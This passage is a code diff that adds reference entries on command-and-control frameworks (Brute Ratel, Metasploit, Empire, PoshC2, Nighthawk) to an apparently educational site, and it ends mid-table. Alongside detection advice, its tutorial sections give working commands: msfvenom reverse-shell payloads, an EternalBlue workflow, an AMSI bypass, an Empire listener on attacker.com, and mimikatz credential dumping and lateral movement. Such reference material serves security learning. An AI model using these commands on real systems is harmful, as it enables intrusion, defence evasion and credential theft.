+### Controversy
+In September 2022, cracked versions of BRc4 appeared on criminal forums, leading to:
+- Nation-state actors using the tool
+- Ransomware groups deploying Badgers
+- Increased defensive scrutiny
+- License verification improvements
+
+This highlights the dual-use challenge of offensive security tools.
+
+## Architecture Deep Dive
+
+### Core Philosophy
+BRc4 was designed with one primary goal: **evade EDR at all costs**. Every design decision prioritizes stealth over convenience.
+
+### Badger Agent
+The Badger is BRc4's implant, written in C/C++:
+
+\`\`\`
+┌────────────── Badger Architecture ──────────────┐
+│                                                  │
+│  ┌────────────┐  ┌────────────┐  ┌──────────┐  │
+│  │   Direct   │  │   Sleep    │  │  Memory  │  │
+│  │  Syscalls  │  │   Mask     │  │  Guard   │  │
+│  └─────┬──────┘  └─────┬──────┘  └────┬─────┘  │
+│        └───────────────┼───────────────┘        │
+│                        │                         │
+│              ┌─────────┴───────────┐            │
+│              │    Badger Core      │            │
+│              │  (Command Handler)  │            │
+│              └─────────────────────┘            │
+└──────────────────────────────────────────────────┘
+\`\`\`
+
+### Evasion Techniques
+
+**Direct Syscalls**
+BRc4 calls the Windows kernel directly, bypassing userland hooks:
+- Reads syscall numbers from ntdll
+- Executes syscall instruction directly
+- No calls to hooked API functions
+
+**Sleep Masking**
+During sleep periods:
+1. XOR encrypts Badger memory regions
+2. Changes page permissions (RX → RW)
+3. Obfuscates beacon signatures
+4. Restores on wake
+
+**Memory Guard**
+Monitors for memory scans:
+- Watches for suspicious memory access
+- Can encrypt on-demand
+- Detects EDR scanning patterns
+
+**ETW Blinding**
+Disables Event Tracing for Windows:
+- Patches EtwEventWrite
+- Blocks telemetry to EDR
+- Targets specific providers
+
+## Key Capabilities
+
+### Advanced C2 Channels
+\`\`\`
+Protocols:
+├── HTTP/HTTPS (malleable profiles)
+├── DNS (encoded subdomains)
+├── DoH/DoT (encrypted DNS)
+├── SMB (named pipe pivoting)
+└── TCP (direct connections)
+\`\`\`
+
+### LDAP Sentinel
+Unique feature for monitoring AD queries:
+- Watches for BloodHound/SharpHound
+- Alerts on suspicious LDAP enumeration
+- Helps operators avoid blue team traps
+
+### DOH (DNS over HTTPS)
+Built-in support for encrypted DNS:
+\`\`\`
+Providers:
+- Cloudflare (1.1.1.1)
+- Google (8.8.8.8)
+- Custom resolvers
+\`\`\`
+
+### Credential Operations
+- Windows Credential Manager access
+- Browser credential extraction
+- Kerberos ticket manipulation
+- SAM/NTDS extraction
+
+## Comparison with Cobalt Strike
+
+| Feature | Cobalt Strike | Brute Ratel |
+|---------|---------------|-------------|
+| Userland hook bypass | BOF-dependent | Native |
+| Sleep encryption | Malleable (basic) | Built-in |
+| Memory obfuscation | Sleep mask kit | Native |
+| Direct syscalls | BOF-dependent | Native |
+| Price | $5,900/year | $2,500/year |
+| Maturity | Very mature | Newer |
+| Detection rate | High | Lower (2022-23) |
+
+## Detection Considerations
+
+### Why It's Hard to Detect
+- No userland API calls to hook
+- Encrypted during sleep
+- Mimics legitimate traffic patterns
+- ETW blind spots
+
+### Detection Approaches
+1. **Kernel-level monitoring**: ETW-Ti (Threat Intelligence)
+2. **Hardware telemetry**: CPU performance counters
+3. **Behavioral analysis**: Process behavior over time
+4. **Network analysis**: HTTP/DNS patterns
+5. **Memory forensics**: During active execution
+
+### Known Indicators (evolving)
+- Specific syscall patterns
+- Sleep timing characteristics
+- Network traffic signatures
+- Loader artifacts
+
+## Licensing & Access
+
+BRc4 has strict licensing:
+- Requires company verification
+- Background checks on purchasers
+- Annual license renewal
+- License tied to specific users
+
+## Learning Resources
+
+- **Official Site**: https://bruteratel.com
+- **Documentation**: Provided to license holders
+- **Paranoid Ninja's Blog**: Technical research
+- **Training**: Offered by the developer
+- **Detection research**: Various security vendors publish analysis
+    `,
     features: ["Badger agent", "EDR evasion", "Direct syscalls", "Sleep masking", "Memory encryption", "Unhooking", "LDAP sentinel", "SMB pivot", "DoH/DoT support", "Custom shellcode loader"],
     protocols: ["HTTP/HTTPS", "DNS", "SMB", "DoH", "DoT"],
     difficulty: "Advanced",
@@ -166,20 +1137,288 @@ const c2Frameworks = [
     url: "https://bruteratel.com",
     useCases: ["EDR-heavy environments", "Advanced adversary simulation", "Mature security programs"],
     limitations: ["Expensive", "Licensing controversies", "Leaked versions in the wild"],
+    versionHistory: [
+      { version: "1.4+", date: "2023-2024", highlights: "Continued evasion improvements" },
+      { version: "1.0-1.3", date: "2021-2022", highlights: "Initial releases, cracked version leak" },
+    ],
+    communityResources: [
+      "Licensed user forums",
+      "Paranoid Ninja Discord",
+      "Training courses",
+    ],
   },
   {
     name: "Metasploit Framework",
     type: "Open Source",
     language: "Ruby",
-    description: "Classic exploitation framework with Meterpreter payload",
-    longDescription: "Metasploit is the granddaddy of exploitation frameworks, originally created by H.D. Moore in 2003. While not purpose-built as a C2 framework, Meterpreter provides robust post-exploitation capabilities. It's widely used for penetration testing, vulnerability research, and learning. The extensive module library covers thousands of exploits and post-exploitation techniques.",
-    features: ["Exploit database", "Meterpreter", "Post modules", "Auxiliary modules", "Payload generation", "Pivoting", "Port forwarding", "Credential harvesting", "Extensive documentation"],
-    protocols: ["HTTP/HTTPS", "TCP", "Reverse shells", "Bind shells"],
+    description: "The world's most widely used penetration testing framework with Meterpreter payload",
+    longDescription: "Metasploit is the foundational penetration testing framework, originally created by H.D. Moore in 2003 and now maintained by Rapid7. It revolutionized the security industry by democratizing access to exploit development and security testing. The framework includes over 2,500+ exploits, 1,100+ auxiliary modules, and 600+ post-exploitation modules. Meterpreter (Meta-Interpreter) is its advanced, dynamically extensible payload that operates entirely in memory, providing powerful post-exploitation capabilities. Metasploit is essential learning for any security professional and remains the gold standard for vulnerability validation.",
+    deepDiveContent: `
+## History & Background
+
+Metasploit was created by **H.D. Moore** in 2003, initially as a portable network tool using Perl. It was rewritten in Ruby in 2007 and acquired by **Rapid7** in 2009. The framework fundamentally changed offensive security by making exploit development accessible.
+
+### Impact on Security Industry
+- Democratized penetration testing
+- Standardized exploit framework concepts
+- Created massive community contribution model
+- Established payload/stager architecture patterns
+- Influenced every C2 framework that followed
+
+### Versions
+- **Framework** (Free): Full open-source version
+- **Pro** (Commercial): Enterprise features, reporting, automation
+- **Express** (Discontinued): Mid-tier option
+
+## Architecture Deep Dive
+
+### Module Architecture
+\`\`\`
+metasploit-framework/
+├── modules/
+│   ├── exploits/      # ~2,500 exploits
+│   │   ├── windows/
+│   │   ├── linux/
+│   │   ├── multi/
+│   │   └── ...
+│   ├── auxiliary/     # ~1,100 scanners/fuzzers
+│   ├── post/          # ~600 post-exploitation
+│   ├── payloads/      # Stagers, singles, stages
+│   ├── encoders/      # Payload encoding
+│   ├── nops/          # NOP generators
+│   └── evasion/       # AV evasion templates
+└── lib/
+    └── msf/           # Core framework
+\`\`\`
+
+### Payload Architecture
+
+**Singles (Inline)**
+- Self-contained payloads
+- All functionality in one payload
+- Larger size, but no staging needed
+- Example: \`windows/shell/reverse_tcp\` (staged) vs \`windows/shell_reverse_tcp\` (single)
+
+**Stagers + Stages**
+\`\`\`
+┌──────────────────────────────────────────────────────┐
+│                   Payload Flow                        │
+├──────────────────────────────────────────────────────┤
+│                                                       │
+│   ┌─────────┐        ┌─────────┐       ┌──────────┐ │
+│   │ Stager  │───────>│  Stage  │──────>│ Handler  │ │
+│   │ (small) │        │ (large) │       │ (msfcon) │ │
+│   └─────────┘        └─────────┘       └──────────┘ │
+│                                                       │
+│   Stager: Establishes connection, downloads stage     │
+│   Stage: Full Meterpreter sent over connection        │
+│   Handler: msfconsole multi/handler                   │
+└──────────────────────────────────────────────────────┘
+\`\`\`
+
+### Meterpreter Architecture
+Meterpreter is Metasploit's advanced payload:
+- **In-memory execution**: No disk artifacts
+- **Encrypted communication**: TLS by default
+- **Extensible**: Load modules on-demand
+- **Cross-platform**: Windows, Linux, macOS, Android, PHP, Java
+- **Reflective loading**: DLL injection without file
+
+## Key Capabilities
+
+### Exploit Database
+\`\`\`
+msf6> search type:exploit platform:windows cve:2021
+
+# Categories include:
+- Remote Code Execution
+- Privilege Escalation  
+- Web Application
+- Client-Side
+- Local Exploits
+\`\`\`
+
+### Post-Exploitation Modules
+\`\`\`
+# Windows post modules
+meterpreter> run post/windows/gather/hashdump
+meterpreter> run post/windows/gather/credentials/credential_collector
+meterpreter> run post/windows/manage/migrate
+meterpreter> run post/multi/recon/local_exploit_suggester
+
+# Multi-platform
+meterpreter> run post/multi/gather/ssh_creds
+meterpreter> run post/multi/manage/shell_to_meterpreter
+\`\`\`
+
+### Pivoting & Routing
+\`\`\`
+# Add route through meterpreter session
+msf6> route add 10.10.10.0/24 1
+
+# SOCKS proxy
+msf6> use auxiliary/server/socks_proxy
+msf6> set SRVPORT 1080
+msf6> run
+
+# Port forwarding
+meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.5
+\`\`\`
+
+### msfvenom Payload Generation
+\`\`\`bash
+# Windows executable
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -o shell.exe
+
+# Linux ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f elf -o shell
+
+# PowerShell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f psh-cmd
+
+# Shellcode (for custom loaders)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f c
+
+# With encoding
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe
+\`\`\`
+
+## Why Metasploit Is Heavily Detected
+
+### Known Signatures
+- Default shellcode patterns
+- Meterpreter memory structures
+- TLV (Type-Length-Value) communication protocol
+- Standard stager behavior
+- Known file hashes
+
+### When to Use vs. Not Use
+**Use Metasploit For:**
+- Learning exploitation
+- CTF competitions
+- Vulnerability validation
+- Undefended networks
+- Initial access (then migrate to stealthier C2)
+
+**Don't Use For:**
+- Operations against EDR
+- Long-term persistence
+- Stealth-required scenarios
+- Advanced adversary simulation
+
+## Detection Considerations
+
+### Network Signatures
+- TLV protocol patterns
+- Default SSL certificates
+- Stager network patterns
+- Known callback URIs
+
+### Host Indicators
+- Reflective DLL loading
+- Specific memory signatures
+- Process injection patterns
+- Well-documented YARA rules
+
+### YARA Rule Example
+\`\`\`yara
+rule Meterpreter_Reverse_TCP {
+    meta:
+        description = "Detects Meterpreter reverse TCP payload"
+    strings:
+        $s1 = { 6A 05 FF D6 50 50 68 EA 0F DF E0 }
+        $s2 = { FC E8 8F 00 00 00 }
+    condition:
+        any of them
+}
+\`\`\`
+
+## Getting Started Tutorial
+
+\`\`\`bash
+# Install on Kali (pre-installed)
+# Or on other Linux:
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod +x msfinstall && ./msfinstall
+
+# Initialize database
+msfdb init
+
+# Start msfconsole
+msfconsole
+
+# Basic exploitation workflow
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue)> set RHOSTS 10.10.10.5
+msf6 exploit(ms17_010_eternalblue)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(ms17_010_eternalblue)> set LHOST 10.0.0.1
+msf6 exploit(ms17_010_eternalblue)> exploit
+
+# Post-exploitation
+meterpreter> getuid
+meterpreter> sysinfo
+meterpreter> hashdump
+meterpreter> getsystem
+meterpreter> migrate -P explorer.exe
+\`\`\`
+
+## Learning Resources
+
+- **Official Docs**: https://docs.metasploit.com/
+- **Offensive Security**: OSCP/PWK heavily features Metasploit
+- **Metasploit Unleashed**: Free online course
+- **Rapid7 Blog**: New module announcements
+- **GitHub**: https://github.com/rapid7/metasploit-framework
+- **Exploit-DB**: Searchable exploit database
+    `,
+    features: [
+      "2,500+ Exploit modules",
+      "Meterpreter advanced payload",
+      "1,100+ Auxiliary modules", 
+      "600+ Post-exploitation modules",
+      "msfvenom payload generator",
+      "Multi-platform support",
+      "Session management",
+      "Pivoting & port forwarding",
+      "Credential harvesting",
+      "Database integration",
+      "Resource scripting",
+      "Active Directory attacks",
+      "Web application testing",
+      "Extensive documentation"
+    ],
+    protocols: ["HTTP/HTTPS", "TCP", "UDP", "Reverse shells", "Bind shells", "Named pipes", "DNS"],
     difficulty: "Beginner",
-    cost: "Free (Pro version available)",
+    cost: "Free (Pro version available at $15,000/year)",
     url: "https://www.metasploit.com",
-    useCases: ["Learning exploitation", "Penetration testing", "Vulnerability validation", "CTF competitions"],
-    limitations: ["Heavily signatured", "Not designed for stealth", "Limited OPSEC features"],
+    useCases: [
+      "Learning exploitation fundamentals",
+      "Penetration testing",
+      "Vulnerability validation",
+      "CTF competitions",
+      "Security research",
+      "Red team initial access",
+      "Payload development learning"
+    ],
+    limitations: [
+      "Heavily signatured by AV/EDR",
+      "Not designed for stealth operations",
+      "Limited OPSEC features compared to modern C2s",
+      "Meterpreter easily detected in memory",
+      "Network traffic patterns well-known"
+    ],
+    extendedContent: true, // Flag to render extended Metasploit section
+    versionHistory: [
+      { version: "6.x", date: "2020-present", highlights: "Ruby 3 support, continued updates" },
+      { version: "5.x", date: "2019-2020", highlights: "JSON RPC, database improvements" },
+      { version: "4.x", date: "2011-2019", highlights: "Pro integration, major growth" },
+    ],
+    communityResources: [
+      "GitHub Discussions",
+      "Rapid7 Community",
+      "r/metasploit subreddit",
+      "Discord servers",
+    ],
   },
   {
     name: "Empire/Starkiller",
@@ -187,6 +1426,212 @@ const c2Frameworks = [
     language: "Python/PowerShell/C#",
     description: "PowerShell and Python-based post-exploitation framework",
     longDescription: "Empire was originally developed by @harmj0y and @sixdub, and is now maintained by BC-Security. It specializes in PowerShell and Python-based post-exploitation with a focus on Windows Active Directory environments. Starkiller provides a modern GUI frontend, replacing the original command-line interface.",
+    deepDiveContent: `
+## History & Background
+
+Empire has a rich history in the offensive security community:
+
+**Timeline:**
+- **2015**: Original Empire released by @harmj0y and @sixdub
+- **2019**: Original project deprecated
+- **2020**: BC-Security forks and revives as Empire 4.0
+- **2021+**: Starkiller GUI added, Python 3 rewrite
+
+Empire was groundbreaking because it brought sophisticated PowerShell post-exploitation to the masses, implementing techniques from research by @harmj0y, @mattifestation, and others.
+
+## Architecture Deep Dive
+
+### Server/Client Model
+\`\`\`
+┌────────────────── Empire Architecture ──────────────────┐
+│                                                          │
+│  ┌──────────────────────────────────────────────────┐   │
+│  │           Empire Server (Python)                  │   │
+│  ├──────────────┬──────────────┬──────────────────┤   │
+│  │  Listeners   │   Database   │    REST API       │   │
+│  │  (HTTP/DNS)  │   (SQLite)   │                   │   │
+│  └──────┬───────┴──────────────┴────────┬─────────┘   │
+│         │                                │             │
+│   ┌─────┴─────┐                   ┌──────┴──────┐     │
+│   │  Agents   │                   │  Starkiller │     │
+│   │ (PS/Py/C#)│                   │    (GUI)    │     │
+│   └───────────┘                   └─────────────┘     │
+└──────────────────────────────────────────────────────────┘
+\`\`\`
+
+### Agent Types
+
+| Agent | Language | Platform | Use Case |
+|-------|----------|----------|----------|
+| PowerShell | PowerShell | Windows | Primary Windows agent |
+| Python | Python | Linux/macOS | Cross-platform |
+| C# | C# | Windows | .NET environments |
+| IronPython | IronPython | Windows | Python without interpreter |
+
+### Listener Types
+- **HTTP**: Standard web traffic
+- **HTTP COM**: Uses COM objects for traffic
+- **HTTP Foreign**: Accepts connections from other frameworks
+- **Malleable**: Cobalt Strike-compatible profiles
+- **OneDrive**: Uses OneDrive as dead drop
+- **Dropbox**: Uses Dropbox as dead drop
+
+## Key Capabilities
+
+### PowerShell Tradecraft
+Empire pioneered many PowerShell techniques:
+
+**In-Memory Execution**
+\`\`\`powershell
+# Empire agents run entirely in memory
+# No powershell.exe - uses System.Management.Automation
+$ps = [PowerShell]::Create()
+$ps.AddScript($script).Invoke()
+\`\`\`
+
+**AMSI Bypass**
+\`\`\`powershell
+# Empire includes AMSI patches
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+\`\`\`
+
+**PowerView Integration**
+Built-in AD reconnaissance:
+- Get-DomainUser
+- Get-DomainGroup  
+- Get-DomainComputer
+- Find-LocalAdminAccess
+- Get-NetSession
+
+### Module Library
+\`\`\`
+modules/
+├── code_execution/
+│   ├── invoke_assembly
+│   ├── invoke_bof
+│   └── invoke_shellcode
+├── collection/
+│   ├── keylogger
+│   ├── screenshot
+│   └── clipboard
+├── credentials/
+│   ├── mimikatz/
+│   ├── kerberoast
+│   └── dcsync
+├── lateral_movement/
+│   ├── invoke_psexec
+│   ├── invoke_wmi
+│   └── invoke_smbexec
+├── persistence/
+│   ├── registry
+│   ├── scheduled_task
+│   └── wmi_subscription
+├── privesc/
+│   ├── bypassuac_*
+│   ├── powerup
+│   └── getsystem
+└── situational_awareness/
+    ├── network/
+    └── host/
+\`\`\`
+
+### Active Directory Attacks
+\`\`\`
+# Kerberoasting
+(Empire: agent) > usemodule credentials/kerberoast
+(Empire: kerberoast) > execute
+
+# DCSync
+(Empire: agent) > usemodule credentials/mimikatz/dcsync
+(Empire: dcsync) > set user krbtgt
+(Empire: dcsync) > execute
+
+# Golden Ticket
+(Empire: agent) > usemodule credentials/mimikatz/golden_ticket
+\`\`\`
+
+### Starkiller GUI
+The modern web interface provides:
+- Visual agent management
+- Task queuing and results
+- Module search and configuration
+- Reporting and timelines
+- Multi-user support
+
+## Detection Considerations
+
+### PowerShell Monitoring
+Empire agents trigger:
+- Script Block Logging (4104)
+- Module Logging
+- PowerShell Transcription
+- AMSI events
+
+### Network Indicators
+- HTTP callback patterns
+- Cookie/header-based staging
+- Default profile indicators
+- Base64 in communications
+
+### Host Indicators
+- PowerShell execution without powershell.exe
+- System.Management.Automation loading
+- Known obfuscation patterns
+- Memory signatures
+
+### Defensive Recommendations
+1. **Enable PowerShell logging**: Script Block + Module logging
+2. **AMSI integration**: Ensure AMSI is active
+3. **PowerShell Constrained Language Mode**: Blocks many techniques
+4. **Application whitelisting**: Block unauthorized PS execution
+5. **Monitor for known techniques**: PowerView, Mimikatz patterns
+
+## Getting Started Tutorial
+
+\`\`\`bash
+# Install Empire
+git clone https://github.com/BC-SECURITY/Empire.git
+cd Empire
+./setup/install.sh
+
+# Start the server
+sudo ./ps-empire server
+
+# In another terminal, start Starkiller
+./starkiller
+
+# Or use CLI
+sudo ./ps-empire client
+
+# CLI Workflow
+(Empire) > listeners
+(Empire: listeners) > uselistener http
+(Empire: listeners/http) > set Host http://attacker.com:80
+(Empire: listeners/http) > set Port 80
+(Empire: listeners/http) > execute
+
+# Generate launcher
+(Empire) > usestager windows/launcher_bat
+(Empire: stager/windows/launcher_bat) > set Listener http
+(Empire: stager/windows/launcher_bat) > execute
+
+# Interact with agent
+(Empire) > agents
+(Empire) > interact <agent_name>
+(Empire: <agent>) > sysinfo
+(Empire: <agent>) > usemodule credentials/mimikatz/logonpasswords
+(Empire: mimikatz/logonpasswords) > execute
+\`\`\`
+
+## Learning Resources
+
+- **BC-Security GitHub**: https://github.com/BC-SECURITY/Empire
+- **BC-Security Blog**: Technical articles
+- **Starkiller**: https://github.com/BC-SECURITY/Starkiller
+- **Documentation**: https://bc-security.gitbook.io/empire-wiki
+- **YouTube**: BC-Security channel
+- **Training**: BC-Security offers courses
+    `,
     features: ["PowerShell agents", "Python agents", "C# agents", "Starkiller GUI", "Module library", "Listener types", "Malleable profiles", "IronPython agent", "Credential database", "Plugin system"],
     protocols: ["HTTP/HTTPS", "Dropbox", "OneDrive", "Malleable"],
     difficulty: "Beginner",
@@ -194,6 +1639,17 @@ const c2Frameworks = [
     url: "https://github.com/BC-SECURITY/Empire",
     useCases: ["Active Directory attacks", "PowerShell-based operations", "Learning post-exploitation"],
     limitations: ["PowerShell heavily monitored", "AMSI can block agents", "Needs obfuscation"],
+    versionHistory: [
+      { version: "5.x", date: "2023-2024", highlights: "C# agents, improvements" },
+      { version: "4.x", date: "2020-2022", highlights: "BC-Security revival, Python 3" },
+      { version: "3.x", date: "2017-2019", highlights: "Original project" },
+    ],
+    communityResources: [
+      "BC-Security Discord",
+      "GitHub Discussions",
+      "Twitter @BCSecurity1",
+      "YouTube tutorials",
+    ],
   },
   {
     name: "PoshC2",
@@ -201,6 +1657,180 @@ const c2Frameworks = [
     language: "Python/PowerShell/C#",
     description: "Proxy-aware C2 framework with multiple implant types",
     longDescription: "PoshC2 is a proxy-aware C2 framework written by Nettitude. It supports multiple implant types including PowerShell, C#, and Python, making it versatile for different environments. The framework is designed to be modular and extensible with a focus on operational flexibility.",
+    deepDiveContent: `
+## History & Background
+
+PoshC2 was developed by **Ben Turner** and the team at **Nettitude** (an NCC Group company). Released as open source, it was designed to provide a practical C2 framework for real-world penetration testing engagements where complex proxy configurations are common.
+
+### Design Philosophy
+- **Proxy-awareness**: Works through complex enterprise proxy chains
+- **Flexibility**: Multiple implant types and communication methods
+- **Practicality**: Built by pentesters for real-world engagements
+- **Simplicity**: Easy to deploy and operate
+
+## Architecture Deep Dive
+
+### Component Overview
+\`\`\`
+┌────────────────── PoshC2 Architecture ──────────────────┐
+│                                                          │
+│  ┌──────────────────────────────────────────────────┐   │
+│  │           PoshC2 Server (Python)                  │   │
+│  ├──────────────┬──────────────┬──────────────────┤   │
+│  │   C2 Server  │   Database   │    File Server    │   │
+│  │   (HTTP/S)   │   (SQLite)   │                   │   │
+│  └──────┬───────┴──────────────┴──────────────────┘   │
+│         │                                               │
+│   ┌─────┴──────────────────────────────────┐           │
+│   │            Implant Types               │           │
+│   ├────────────┬────────────┬─────────────┤           │
+│   │ PoshC2.PS  │ Sharp.C#   │  PoshC2.Py  │           │
+│   │ PowerShell │   C#       │   Python    │           │
+│   └────────────┴────────────┴─────────────┘           │
+└──────────────────────────────────────────────────────────┘
+\`\`\`
+
+### Implant Types
+
+| Implant | Language | Platforms | Notes |
+|---------|----------|-----------|-------|
+| PoshC2.PS | PowerShell | Windows | Full PowerShell capabilities |
+| Sharp | C# | Windows | .NET, better evasion |
+| PoshC2.Py | Python | Linux/macOS | Cross-platform support |
+| FComm | File-based | Air-gapped | For isolated networks |
+
+### Communication Mechanisms
+- **HTTP/HTTPS**: Standard web traffic with proxy support
+- **DNS**: Tunnel data in DNS queries/responses
+- **Daisy-chaining**: Route through other implants
+- **FComm**: File-based for air-gapped networks
+
+## Key Capabilities
+
+### Exceptional Proxy Support
+PoshC2 excels at proxy traversal:
+\`\`\`powershell
+# Uses system proxy settings automatically
+# Supports proxy authentication (NTLM, Basic)
+# Works with PAC files
+# Handles corporate proxy chains
+# Domain fronting capable
+\`\`\`
+
+### Payload Generation
+\`\`\`bash
+# Generate various payloads from the implant handler:
+# - PowerShell one-liners
+# - C# executables (EXE/DLL)
+# - Python payloads
+# - HTA files
+# - VBA macros
+# - JScript/VBScript
+# - Shellcode
+# - MSBuild XML
+\`\`\`
+
+### Module Library
+Organized by category:
+- **Credentials**: Mimikatz, Kerberos attacks, credential manager
+- **Lateral Movement**: WMI, PSExec, DCOM, WinRM
+- **Persistence**: Registry, scheduled tasks, WMI subscriptions
+- **Enumeration**: PowerView, SharpHound, network scanning
+- **Privilege Escalation**: Various local and domain techniques
+
+### Command Examples
+\`\`\`
+# Implant interaction
+PoshC2> searchhelp credential
+PoshC2> loadmodule Invoke-Mimikatz.ps1
+PoshC2> invoke-mimikatz -dumpcreds
+
+# Lateral movement
+PoshC2> invoke-wmiexec -target 10.0.0.5 -command "whoami"
+PoshC2> invoke-psexec -target 10.0.0.5
+PoshC2> invoke-dcom -target 10.0.0.5 -method mmc20
+
+# Persistence
+PoshC2> install-persistence -regkey
+PoshC2> install-persistence -scheduledtask
+
+# Network enumeration
+PoshC2> portscan 10.0.0.0/24 22,80,443,445,3389
+\`\`\`
+
+### Daisy-Chaining
+Route implants through each other for segmented networks:
+\`\`\`
+                      Internal Network
+Internet → ┌─────────┐     ┌─────────┐     ┌─────────┐
+           │ Implant │ ──> │ Implant │ ──> │ Implant │
+           │ (DMZ)   │     │ (Tier1) │     │ (Tier2) │
+           └─────────┘     └─────────┘     └─────────┘
+              ↑                               ↑
+         Egress point                  Isolated target
+\`\`\`
+
+## Detection Considerations
+
+### Network Indicators
+- HTTP callback patterns (customizable)
+- DNS tunneling signatures
+- Default User-Agent strings (should be changed)
+- URL patterns (configurable)
+
+### Host Indicators
+- PowerShell execution patterns
+- .NET assembly loading for Sharp implants
+- Process genealogy anomalies
+- Memory signatures of implants
+
+### Defensive Recommendations
+1. Monitor PowerShell logging (Script Block, Module, Transcription)
+2. Deploy AMSI and ensure it's not bypassed
+3. Analyze DNS query patterns for tunneling
+4. Profile proxy traffic for anomalies
+5. Endpoint detection for known implant patterns
+
+## Getting Started Tutorial
+
+\`\`\`bash
+# Clone repository
+git clone https://github.com/nettitude/PoshC2.git
+cd PoshC2
+
+# Install dependencies
+sudo ./Install.sh
+
+# Create new project
+posh-project -n myproject
+
+# Configure settings
+# Edit poshc2_server_config.yml
+# Set:
+#   - PayloadCommsHost (your C2 URL)
+#   - DomainFrontHeader (optional)
+#   - DefaultSleep (beacon interval)
+
+# Start server
+posh-server
+
+# In another terminal, start implant handler
+posh
+
+# Generate payloads from ImplantHandler
+# Options include: PowerShell, Sharp, Python, HTA, etc.
+
+# Deploy to target and interact via PoshC2 console
+\`\`\`
+
+## Learning Resources
+
+- **GitHub**: https://github.com/nettitude/PoshC2
+- **Documentation**: https://poshc2.readthedocs.io/
+- **Nettitude Blog**: Technical articles and case studies
+- **YouTube**: Setup and operation tutorials
+- **Twitter**: @naboris, @Nettaboris
+    `,
     features: ["Multiple implant types", "Proxy aware", "Domain fronting", "SOCKS proxy", "Daisy chaining", "Modular design", "Reporting", "Sharp implants", "Cross-platform"],
     protocols: ["HTTP/HTTPS", "DNS"],
     difficulty: "Intermediate",
@@ -208,6 +1838,17 @@ const c2Frameworks = [
     url: "https://github.com/nettitude/PoshC2",
     useCases: ["Proxy-heavy environments", "Multi-platform needs", "Flexible operations"],
     limitations: ["Smaller community", "Less documentation", "Fewer integrations"],
+    versionHistory: [
+      { version: "8.x", date: "2023-2024", highlights: "Python 3, Sharp improvements, stability" },
+      { version: "7.x", date: "2021-2022", highlights: "Major refactor, improved Sharp" },
+      { version: "6.x", date: "2020", highlights: "FComm, enhanced daisy-chaining" },
+    ],
+    communityResources: [
+      "GitHub Issues and Discussions",
+      "Nettitude Labs Discord",
+      "Twitter @naboris",
+      "PoshC2 ReadTheDocs",
+    ],
   },
   {
     name: "Nighthawk",
@@ -215,6 +1856,177 @@ const c2Frameworks = [
     language: "C/C++",
     description: "Highly evasive commercial C2 from MDSec",
     longDescription: "Nighthawk is MDSec's commercial C2 framework, designed from the ground up for evasion. It uses advanced techniques to avoid detection by modern security tools and provides operators with granular control over implant behavior. Access is restricted to vetted organizations.",
+    deepDiveContent: `
+## History & Background
+
+Nighthawk is a commercial C2 framework developed by **MDSec** (formerly Moloch Dev). Released as a commercial product for authorized red teams, it's designed specifically for operations against mature security environments with advanced EDR deployments.
+
+### Market Position
+Nighthawk competes directly with:
+- Brute Ratel C4
+- Cobalt Strike (heavily modified)
+- Other premium commercial C2s
+
+It differentiates by focusing heavily on detection evasion and operational security from the ground up.
+
+### Controversy
+Like Brute Ratel, Nighthawk has been observed in use by sophisticated threat actors, highlighting the challenges of commercial offensive tool distribution. This has led to increased security research and detection capabilities targeting the framework.
+
+## Architecture Deep Dive
+
+### Design Principles
+\`\`\`
+┌────────────────── Nighthawk Philosophy ──────────────────┐
+│                                                           │
+│   1. OPSEC First: Every feature designed for stealth     │
+│   2. EDR Awareness: Built to bypass modern defenses      │
+│   3. Memory Safety: Minimize forensic artifacts          │
+│   4. Traffic Blending: Appear as legitimate traffic      │
+│   5. Flexibility: Adapt to any operational environment   │
+│                                                           │
+└───────────────────────────────────────────────────────────┘
+\`\`\`
+
+### Agent Architecture
+The Nighthawk agent employs multiple evasion layers simultaneously:
+
+**Direct Syscalls**
+- Bypasses userland API hooks entirely
+- Dynamically resolves syscall numbers
+- No calls to hooked ntdll.dll exports
+- Adapts to different Windows versions
+
+**Sleep Masking**
+- Encrypts agent memory regions during sleep
+- Changes memory permissions (RWX → RW)
+- Defeats memory scanning during idle
+- Configurable sleep intervals with jitter
+
+**Call Stack Spoofing**
+- Spoofs return addresses on call stack
+- Defeats stack-based detection heuristics
+- Mimics legitimate call chains
+- Chains through known good modules
+
+**Module Stomping**
+- Loads code into legitimate signed modules
+- Avoids suspicious memory allocations
+- Blends with normal process memory map
+- Harder to identify in memory forensics
+
+## Key Capabilities
+
+### Communication Channels
+| Channel | Description | OPSEC Rating |
+|---------|-------------|--------------|
+| HTTP/S | Standard web traffic with malleable profiles | Medium |
+| DNS | Covert channel via DNS queries | High |
+| DoH/DoT | Encrypted DNS (Cloudflare, Google) | Very High |
+| SMB | Internal lateral movement | High |
+
+### Execution Methods
+- Multiple process injection techniques
+- Thread execution hijacking
+- Module stomping variants
+- Direct assembly execution
+- Cobalt Strike BOF compatibility
+- Custom BOF development support
+
+### Post-Exploitation Features
+- Credential access (multiple techniques)
+- Advanced lateral movement
+- Granular persistence mechanisms
+- File operations with OPSEC options
+- Network reconnaissance
+- Token manipulation
+
+### Pivoting Capabilities
+- SOCKS proxy with traffic masking
+- Port forwarding
+- SMB-based pivoting
+- Daisy-chain agents
+- Multi-hop tunnels
+
+## Evasion Techniques Comparison
+
+### Compared to Other Premium C2s
+
+| Technique | Cobalt Strike | Brute Ratel | Nighthawk |
+|-----------|---------------|-------------|-----------|
+| Direct syscalls | BOF-dependent | Native | Native |
+| Sleep encryption | Sleep Mask Kit | Native | Multi-layer |
